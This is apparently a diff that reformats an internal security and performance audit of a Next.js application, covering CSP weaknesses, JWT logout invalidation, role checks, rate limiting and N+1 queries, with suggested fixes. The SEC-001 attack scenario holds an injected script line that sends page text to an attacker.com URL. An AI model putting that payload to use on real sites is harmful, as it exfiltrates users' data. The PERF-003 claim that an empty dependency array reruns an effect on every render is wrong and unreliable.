@@ -6,23 +6,23 @@
 
 **Classification:** CONFIDENTIAL - FOR INTERNAL USE ONLY  
 **Date:** 2026-07-01  
-**Auditor:** Security Audit Team  
+**Auditor:** Security Audit Team
 
 ---
 
 ## SECURITY ASSESSMENT SUMMARY
 
-| Category | Status | Score | Risk Level |
-|----------|--------|-------|-----------|
-| **Authentication** | ✅ Strong | 90/100 | LOW |
-| **Authorization** | 🟡 Issues Found | 70/100 | MEDIUM |
-| **Data Protection** | ✅ Good | 85/100 | LOW |
-| **Session Management** | 🟡 Gaps | 65/100 | HIGH |
-| **Cryptography** | ✅ Sound | 95/100 | LOW |
-| **API Security** | ✅ Good | 80/100 | MEDIUM |
-| **Network Security** | 🟡 CSP Issues | 60/100 | HIGH |
-| **Audit & Logging** | 🟡 Incomplete | 70/100 | MEDIUM |
-| **OVERALL SECURITY** | 🟡 Acceptable with Gaps | **75/100** | **MEDIUM** |
+| Category               | Status                  | Score      | Risk Level |
+| ---------------------- | ----------------------- | ---------- | ---------- |
+| **Authentication**     | ✅ Strong               | 90/100     | LOW        |
+| **Authorization**      | 🟡 Issues Found         | 70/100     | MEDIUM     |
+| **Data Protection**    | ✅ Good                 | 85/100     | LOW        |
+| **Session Management** | 🟡 Gaps                 | 65/100     | HIGH       |
+| **Cryptography**       | ✅ Sound                | 95/100     | LOW        |
+| **API Security**       | ✅ Good                 | 80/100     | MEDIUM     |
+| **Network Security**   | 🟡 CSP Issues           | 60/100     | HIGH       |
+| **Audit & Logging**    | 🟡 Incomplete           | 70/100     | MEDIUM     |
+| **OVERALL SECURITY**   | 🟡 Acceptable with Gaps | **75/100** | **MEDIUM** |
 
 ---
 
@@ -115,6 +115,7 @@
 ### 8. Audit Logging ✅ (Mostly Complete)
 
 **Implemented Actions:**
+
 - ✅ LOGIN_SUCCESS (written in `auth.ts`)
 - ✅ LOGIN_FAILURE (written in `auth.ts`)
 - ✅ ACCOUNT_LOCKED (written in `auth.ts`)
@@ -127,6 +128,7 @@
 - ✅ CHANGE_PASSWORD_SUCCESS / CHANGE_PASSWORD_FAILURE (Change Password feature implemented)
 
 **Missing Actions:**
+
 - ❌ LOGOUT
 - ❌ PROJECT_COMPLETED
 - ❌ USER_DELETED / USER_MODIFIED
@@ -143,20 +145,23 @@
 
 **Issue ID:** SEC-001  
 **CVSS Score:** 7.2 (High)  
-**Location:** `next.config.mjs` (lines 4-7)  
+**Location:** `next.config.mjs` (lines 4-7)
 
 **Current CSP:**
+
 ```
 script-src 'self' 'unsafe-eval' 'unsafe-inline'
 style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
 ```
 
 **Vulnerability:**
+
 - `unsafe-eval`: Allows `eval()`, `Function()`, `setTimeout(code)`, etc.
 - `unsafe-inline`: Allows inline `<script>` tags and inline styles
 - Together: Completely defeats CSP protection for scripts
 
 **Attack Scenario:**
+
 ```javascript
 // Attacker injects data into DB
 data = "'; window.fetch('https://attacker.com/steal?data=' + document.body.innerText); //"
@@ -171,6 +176,7 @@ data = "'; window.fetch('https://attacker.com/steal?data=' + document.body.inner
 ```
 
 **Fix Required:**
+
 ```
 script-src 'self'
 style-src 'self' https://fonts.googleapis.com [nonce-{random} for inline styles]
@@ -185,14 +191,16 @@ style-src 'self' https://fonts.googleapis.com [nonce-{random} for inline styles]
 
 **Issue ID:** SEC-002  
 **CVSS Score:** 6.5 (Medium-High)  
-**Location:** `sessionBlocklist` table exists but unused  
+**Location:** `sessionBlocklist` table exists but unused
 
 **Vulnerability:**
+
 - User logs out, but JWT token remains valid for 8 hours
 - If JWT is compromised (e.g., cached, memory dump), attacker can use it
 - No server-side invalidation exists
 
 **Attack Scenario:**
+
 ```
 1. User logs in → JWT issued (valid for 8 hours)
 2. User logs out → cookie cleared, BUT JWT still valid
@@ -204,17 +212,18 @@ style-src 'self' https://fonts.googleapis.com [nonce-{random} for inline styles]
 ```
 
 **Expected Fix:**
+
 ```typescript
 // On logout:
 await db.insert(sessionBlocklist).values({
-  jti: token.jti,  // JWT ID
+  jti: token.jti, // JWT ID
   userId: token.sub,
-  reason: 'LOGOUT',
+  reason: "LOGOUT",
 });
 
 // On every request:
 const isBlocklisted = await checkBlocklist(token.jti);
-if (isBlocklisted) return 401;  // Invalid session
+if (isBlocklisted) return 401; // Invalid session
 ```
 
 **Impact:** Session fixation vulnerability. Attackers can hijack sessions.  
@@ -226,20 +235,25 @@ if (isBlocklisted) return 401;  // Invalid session
 
 **Issue ID:** SEC-003  
 **CVSS Score:** 5.3 (Medium)  
-**Location:** `auth.config.ts` (lines 115-125)  
+**Location:** `auth.config.ts` (lines 115-125)
 
 **Vulnerability:**
 Role 4 (OSD Admin) can access `/admin/projects` via the whitelist exception `!pathname.startsWith("/admin/projects")`.
 
 ```typescript
-if (role === 4 && pathname.startsWith("/admin") && 
-    !pathname.startsWith("/admin/osd") &&
-    !pathname.startsWith("/admin/projects")) {  // ❌ Exception allows access!
+if (
+  role === 4 &&
+  pathname.startsWith("/admin") &&
+  !pathname.startsWith("/admin/osd") &&
+  !pathname.startsWith("/admin/projects")
+) {
+  // ❌ Exception allows access!
   return Response.redirect(new URL("/admin/osd/dashboard", nextUrl));
 }
 ```
 
 **Attack Scenario:**
+
 ```
 1. OSD Admin logs in
 2. OSD Admin can access /admin/projects (should be blocked)
@@ -248,6 +262,7 @@ if (role === 4 && pathname.startsWith("/admin") &&
 ```
 
 **Expected Fix:**
+
 ```typescript
 if (role === 4 && !pathname.startsWith("/admin/osd")) {
   return Response.redirect(new URL("/admin/osd/dashboard", nextUrl));
@@ -263,7 +278,7 @@ if (role === 4 && !pathname.startsWith("/admin/osd")) {
 
 **Issue ID:** SEC-004  
 **CVSS Score:** 4.0 (Low-Medium)  
-**Location:** `OfficerUserMenu.tsx` + `auth.ts`  
+**Location:** `OfficerUserMenu.tsx` + `auth.ts`
 
 **Vulnerability:**
 Logout event not recorded in audit trail. Violates compliance requirement for complete audit trails.
@@ -280,12 +295,13 @@ Wrap `signOut()` in server action that writes audit first.
 
 **Issue ID:** SEC-005  
 **CVSS Score:** 3.7 (Low)  
-**Location:** All protected routes  
+**Location:** All protected routes
 
 **Vulnerability:**
 Protected pages cached by browser. After logout, users can use back button to view cached sensitive data (though API calls return 401).
 
 **Attack Scenario:**
+
 ```
 1. User logs in, views /officer/projects (cached by browser)
 2. User logs out
@@ -295,9 +311,10 @@ Protected pages cached by browser. After logout, users can use back button to vi
 ```
 
 **Expected Fix:**
+
 ```typescript
 export const headers = {
-  'Cache-Control': 'no-store, must-revalidate, max-age=0',
+  "Cache-Control": "no-store, must-revalidate, max-age=0",
 };
 ```
 
@@ -310,26 +327,29 @@ export const headers = {
 
 **Issue ID:** SEC-006  
 **CVSS Score:** 2.5 (Low)  
-**Location:** `lib/validations/login.ts`  
+**Location:** `lib/validations/login.ts`
 
 **Vulnerability:**
 Login form accepts passwords as short as 1 character. Not a vulnerability per se (stored hashes are secure), but indicates inconsistent policy.
 
 **Current Validation:**
+
 ```typescript
-password: z.string().min(1, "Password required").max(200)
+password: z.string().min(1, "Password required").max(200);
 ```
 
 **Expected:**
+
 ```typescript
 // Login: accept whatever is in DB (for backward compat with legacy hashes)
-password: z.string().min(1).max(200)
+password: z.string().min(1).max(200);
 
 // User creation: enforce complexity
-password: z.string().min(8)
+password: z.string()
+  .min(8)
   .regex(/[A-Z]/, "Require uppercase")
   .regex(/[0-9]/, "Require number")
-  .regex(/[!@#$%^&*]/, "Require special char")
+  .regex(/[!@#$%^&*]/, "Require special char");
 ```
 
 **Impact:** Inconsistent password validation policy.  
@@ -341,17 +361,18 @@ password: z.string().min(8)
 
 **Issue ID:** SEC-007  
 **CVSS Score:** 4.3 (Low-Medium)  
-**Location:** `/api/auth/change-password/route.ts` (lines 13-30)  
+**Location:** `/api/auth/change-password/route.ts` (lines 13-30)
 
 **Vulnerability:**
 Rate limiting uses in-memory JavaScript Map, which resets on server restart. Determined attacker can restart server (via DoS) to bypass rate limits.
 
 ```typescript
-const attempts = new Map<number, number[]>();  // Lost on restart!
+const attempts = new Map<number, number[]>(); // Lost on restart!
 ```
 
 **Expected Fix:**
 Use Redis or database-backed rate limiting:
+
 ```typescript
 await redis.incr(`rate_limit:change_password:${userId}`);
 ```
@@ -365,19 +386,22 @@ await redis.incr(`rate_limit:change_password:${userId}`);
 
 **Issue ID:** SEC-008  
 **CVSS Score:** 4.7 (Low-Medium)  
-**Location:** `/api/admin/projects` route  
+**Location:** `/api/admin/projects` route
 
 **Vulnerability:**
 No validation prevents assigning a secretary from Department A to a project in Department B. Violates authorization rule that secretaries manage only their department's projects.
 
 **Expected Fix:**
+
 ```typescript
-const secretary = await db.select().from(userDetails)
+const secretary = await db
+  .select()
+  .from(userDetails)
   .where(eq(userDetails.userId, data.secretaryId));
 if (secretary.deptId !== data.deptId) {
   return NextResponse.json(
     { error: "Secretary must be from same department" },
-    { status: 400 }
+    { status: 400 },
   );
 }
 ```
@@ -391,14 +415,15 @@ if (secretary.deptId !== data.deptId) {
 
 **Issue ID:** SEC-009  
 **CVSS Score:** 2.2 (Low)  
-**Location:** 45+ API routes  
+**Location:** 45+ API routes
 
 **Vulnerability:**
 All error paths include `console.error()` with full error objects. In development/staging, browser console shows internal error details that could aid attackers.
 
 **Expected Fix:**
+
 ```typescript
-if (process.env.NODE_ENV === 'development') {
+if (process.env.NODE_ENV === "development") {
   console.error("...", err);
 }
 ```
@@ -413,21 +438,21 @@ if (process.env.NODE_ENV === 'development') {
 # PERFORMANCE FINDINGS REPORT
 
 **Date:** 2026-07-01  
-**Auditor:** Performance Engineering Team  
+**Auditor:** Performance Engineering Team
 
 ---
 
 ## PERFORMANCE ASSESSMENT SUMMARY
 
-| Category | Status | Score | Impact |
-|----------|--------|-------|--------|
-| **Query Performance** | 🔴 Critical | 40/100 | Page load delays |
-| **Client-Side Rendering** | 🟡 Issues | 60/100 | Unnecessary re-renders |
-| **Caching Strategy** | 🔴 Missing | 20/100 | Redundant API calls |
-| **Network Payload** | ✅ Good | 75/100 | Response sizes OK |
-| **Database Indexes** | 🟡 Partial | 65/100 | Some missing |
-| **Load Times** | 🟡 Slow | 55/100 | > 2s on slow networks |
-| **OVERALL PERFORMANCE** | 🟡 Needs Optimization | **52/100** | **MEDIUM IMPACT** |
+| Category                  | Status                | Score      | Impact                 |
+| ------------------------- | --------------------- | ---------- | ---------------------- |
+| **Query Performance**     | 🔴 Critical           | 40/100     | Page load delays       |
+| **Client-Side Rendering** | 🟡 Issues             | 60/100     | Unnecessary re-renders |
+| **Caching Strategy**      | 🔴 Missing            | 20/100     | Redundant API calls    |
+| **Network Payload**       | ✅ Good               | 75/100     | Response sizes OK      |
+| **Database Indexes**      | 🟡 Partial            | 65/100     | Some missing           |
+| **Load Times**            | 🟡 Slow               | 55/100     | > 2s on slow networks  |
+| **OVERALL PERFORMANCE**   | 🟡 Needs Optimization | **52/100** | **MEDIUM IMPACT**      |
 
 ---
 
@@ -437,9 +462,10 @@ if (process.env.NODE_ENV === 'development') {
 
 **Issue ID:** PERF-001  
 **Impact:** 2-3 second page load delays  
-**Location:** `/api/secretary/dashboard/route.ts` (45-130)  
+**Location:** `/api/secretary/dashboard/route.ts` (45-130)
 
 **Current Pattern:**
+
 ```typescript
 // Query 1: Get all departments
 const departments = await db.select().from(master_secretary).limit(100);
@@ -456,12 +482,14 @@ for (const dept of departments) {
 ```
 
 **Network Impact:**
+
 - Single query: 50ms + parsing: 100ms = 150ms total
 - N+1 (11 deps): 11 × 150ms = 1650ms (11x slower!)
 
 **Expected Optimization:**
+
 ```sql
-SELECT 
+SELECT
   dp.sec_id,
   COUNT(DISTINCT mp.project_id) as project_count,
   SUM(mp.total_budget) as total_budget,
@@ -479,9 +507,10 @@ GROUP BY dp.sec_id
 
 **Issue ID:** PERF-002  
 **Impact:** Redundant API calls, slow navigation  
-**Location:** `components/layout/OfficerUserMenu.tsx`, `components/public/ProfilePage.tsx`  
+**Location:** `components/layout/OfficerUserMenu.tsx`, `components/public/ProfilePage.tsx`
 
 **Current Behavior:**
+
 ```typescript
 useEffect(() => {
   fetch('/api/me', { cache: 'no-store' })  // Force cache bypass!
@@ -490,16 +519,18 @@ useEffect(() => {
 ```
 
 **Impact:**
+
 - Navigate between pages → 3-5 redundant `/api/me` calls
 - Each call: 100-200ms
 - Total wasted: 300-1000ms per navigation session
 
 **Expected Optimization:**
 Use SWR or React Query with caching:
+
 ```typescript
-const { data } = useSWR('/api/me', fetch, {
+const { data } = useSWR("/api/me", fetch, {
   revalidateOnFocus: false,
-  dedupingInterval: 5 * 60 * 1000,  // 5-min cache
+  dedupingInterval: 5 * 60 * 1000, // 5-min cache
 });
 ```
 
@@ -511,20 +542,22 @@ const { data } = useSWR('/api/me', fetch, {
 
 **Issue ID:** PERF-003  
 **Impact:** UI lag, CPU usage  
-**Location:** `components/public/SectorGrid.tsx` (lines 87-100)  
+**Location:** `components/public/SectorGrid.tsx` (lines 87-100)
 
 **Current Code:**
+
 ```typescript
 useEffect(() => {
   // Fetches sectors
-}, []);  // ❌ No dependencies! Runs on EVERY render
+}, []); // ❌ No dependencies! Runs on EVERY render
 
 const renderGrid = useMemo(() => {
   // Complex rendering
-}, [sectors]);  // ✅ Correct memoization
+}, [sectors]); // ✅ Correct memoization
 ```
 
 **Impact:**
+
 - `useEffect` with no deps runs on every render
 - If parent re-renders, SectorGrid re-runs fetch
 - Potential infinite loop if not careful
@@ -539,16 +572,19 @@ Add proper dependency arrays.
 ## RECOMMENDATIONS
 
 ### Immediate (Week 1)
+
 1. Optimize dashboard queries (consolidate to single query with JOINs)
 2. Implement SWR/React Query for `/api/me` caching
 3. Profile dashboard load time in Chrome DevTools
 
 ### Short-Term (Week 2-3)
+
 1. Add database indexes on `(dept_id, project_id)`
 2. Cache dashboard responses (5-minute TTL)
 3. Implement lazy loading for large lists
 
 ### Long-Term (Month 2+)
+
 1. Migrate to PostgreSQL read replicas for read-heavy dashboards
 2. Implement server-side pagination
 3. Add CDN for static assets
@@ -556,4 +592,3 @@ Add proper dependency arrays.
 ---
 
 **END OF SECURITY & PERFORMANCE FINDINGS**
-
